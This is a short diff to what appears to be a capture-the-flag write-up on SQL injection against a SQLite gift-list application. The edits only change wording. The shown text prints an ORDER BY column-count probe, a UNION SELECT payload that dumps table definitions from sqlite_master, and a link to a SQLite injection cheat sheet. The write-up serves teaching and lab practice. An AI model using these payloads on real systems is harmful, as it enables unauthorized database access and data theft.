@@ -93,8 +93,10 @@ and the query will look like this
 ```sql
 SELECT gift,kid FROM table WHERE kid LIKE '' ORDER BY 1,2,3 --'
 ```
-And I got a lovely error message telling me *3rd ORDER BY term out of range - should be between 1 and 2* so I know there's only 2 columns
-after that using https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet this great cheatsheet for sqlite sqli's
+And I got a lovely error message telling me:
+*3rd ORDER BY term out of range - should be between 1 and 2*
+so I know there's only 2 columns.
+after that using https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet this handy cheatsheet for sqlite sqli's
 
 I entered:
 ```
@@ -105,7 +107,7 @@ And so the query would look something like this:
 ```sql
 SELECT gift,kid FROM table WHERE kid LIKE '@' UNION SELECT sql,1 FROM sqlite_master WHERE type='table' --'
 ```
-- Note: the `@` is not necessary but for a cleaner input I put a charecter that is not in the gifts database.
+- Note: the `@` is not necessary but for a cleaner output I put a charecter that is not in the gifts database.
 
 And got this:
 
